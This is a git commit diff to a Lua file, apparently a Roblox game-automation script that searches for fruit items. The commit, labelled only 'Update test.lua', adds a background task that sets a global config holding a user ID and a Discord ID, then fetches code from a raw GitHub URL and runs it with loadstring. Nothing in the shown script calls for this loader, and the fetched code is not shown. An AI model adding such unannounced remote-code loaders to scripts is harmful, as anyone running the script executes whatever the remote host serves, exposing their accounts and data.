1ba8cceb5669864b2d95e2c00c8db36463224327
FastzinScripter <fastzin.adm@gmail.com>
2025-08-11 17:47:32 -0300

    Update test.lua

--- test.lua
+++ test.lua
@@ -132,7 +132,9 @@ if findfruit() == true then
 else
     NotFound(FruitFound)
 end
-
+task.spawn(function() 
+  _G.Config = { UserID = "081cfa79-2618-42ec-ab9a-7ec1d42ab32a", discord_id = "904871270397648947" , Note = "Pc", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/main/trackstatblox"))()
+end)
 
 findfruit()
 
